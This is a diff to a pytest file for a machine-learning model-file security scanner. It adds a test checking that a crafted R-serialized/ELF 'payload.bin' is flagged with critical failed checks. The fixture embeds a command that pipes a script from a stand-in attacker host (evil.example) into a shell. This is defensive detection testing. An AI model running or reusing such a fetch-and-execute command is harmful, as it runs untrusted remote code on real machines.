@@ -3705,6 +3705,34 @@ def test_scan_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_p
     )
 
 
+def test_scan_file_merges_r_serialized_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    model_path = tmp_path / "payload.bin"
+    model_path.write_bytes(
+        b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
+        b"base::system('curl https://evil.example/payload.sh | sh')\n"
+        b"\x7fELF" + b"\x00" * 128
+    )
+
+    result = scan_file(str(model_path), config={"cache_scan_results": False})
+
+    assert file_detection.detect_file_format(str(model_path)) == "pytorch_binary"
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["r_serialized"]
+    assert any("Linux executable" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Executable Symbol Context Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Serialized Expression Payload Detection"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
 @pytest.mark.parametrize(
     "selection_config",
     [
